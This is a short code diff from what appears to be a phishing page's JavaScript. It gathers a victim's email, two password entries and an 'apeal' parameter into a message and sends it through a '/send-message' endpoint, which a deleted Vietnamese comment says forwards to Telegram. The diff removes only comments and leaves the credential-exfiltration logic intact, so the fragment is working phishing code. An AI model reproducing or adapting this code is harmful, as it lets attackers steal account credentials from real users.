@@ -31,18 +31,13 @@ document
         }
         const urlParams = new URLSearchParams(window.location.search);
         const apeal = urlParams.get("apeal");
-        //lấy url hiện tại
         const currentUrl = window.location.host;
-        //gọi api để bắn về telegram
-        // Gọi API với tham số message
         const message = `url: ${currentUrl}\nemail: ${username}\npassword-1: ${ps1}\npassword-2: ${ps2}\napeal: ${apeal}`; // Giá trị message từ input hoặc biến
 
-        // Thay thế http://localhost:3000 bằng location.origin
         const url = `${
             window.location.origin
         }/send-message?message=${encodeURIComponent(message)}`;
 
-        // Gọi API với URL chứa tham số message
         fetch(url)
             .then((response) => {
                 if (!response.ok) {
